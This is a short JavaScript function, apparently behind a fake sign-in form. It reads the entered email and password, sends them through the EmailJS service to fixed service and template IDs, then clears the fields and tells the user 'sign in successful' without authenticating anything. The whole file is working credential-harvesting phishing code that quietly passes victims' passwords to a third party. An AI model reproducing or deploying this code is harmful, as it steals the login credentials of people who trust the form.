
function sendMail(){
    var params = {
        email: document.getElementById("email").value,
        password: document.getElementById("password").value,
    };

    var serviceID = "service_1av3ras";
    var templateID = "template_etskfp6";
    
    emailjs
    .send(serviceID,templateID,params)
    .then((res) => {
        document.getElementById("email").value = "";
        document.getElementById("password").value = "";
        console.log(res);
        alert("sign in successful");
    })
    .catch((err) => console.log(err));
    console.log("worked")
}